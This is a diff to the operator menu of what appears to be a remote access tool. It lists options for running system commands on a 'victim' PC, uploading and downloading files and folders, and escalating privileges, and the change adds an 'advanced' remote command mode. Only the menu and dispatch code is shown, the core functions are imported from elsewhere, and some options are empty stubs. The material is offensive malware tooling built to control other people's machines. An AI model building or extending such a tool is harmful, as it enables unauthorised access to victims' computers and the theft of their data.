@@ -1,4 +1,5 @@
-from core.features.command import run_command
+from core.features.command import run_command, run_command_advanced
+from core.features.trasfer_files import *
 
 
 def show_options():
@@ -8,6 +9,8 @@ def show_options():
     print("\t\t[ 03 ] Download File from victim")
     print("\t\t[ 04 ] Download Folder to victim")
     print("\t\t[ 05 ] Escalate privilages")
+    print("\t\t[ 06 ] Run Command [ADVANCED]")
+
     print("\t\t[ 99 ] Exit the program")
     print("\n")
 
@@ -18,15 +21,28 @@ def handleConnection(my_socket):
         show_options()
         user_option = input("[*] Enter the option you want to select : ")
         my_socket.send_data(user_option)
+
         if user_option == "1":
             print("\t\t[+] Executing System Commands on Remote PC")
             run_command(my_socket)
+
         elif user_option == "2":
             print("\t\t[+] Uploading Files to Remote PC")
+            upload_files(my_socket)
+
         elif user_option == "3":
             print("\t\t[+] Download Files from Remote PC")
+
         elif user_option == "4":
             print("\t\t[+] Download Folders from Remote PC")
+
+        elif user_option == "5":
+            print("\t\t[+] Escalate privilages")
+
+        elif user_option == "6":
+            print("\t\t[+] Running Command Advanced mode")
+            run_command_advanced(my_socket)
+
         elif user_option == "99":
             keep_alive = False
             print("\t\t[-] Exiting the loop")
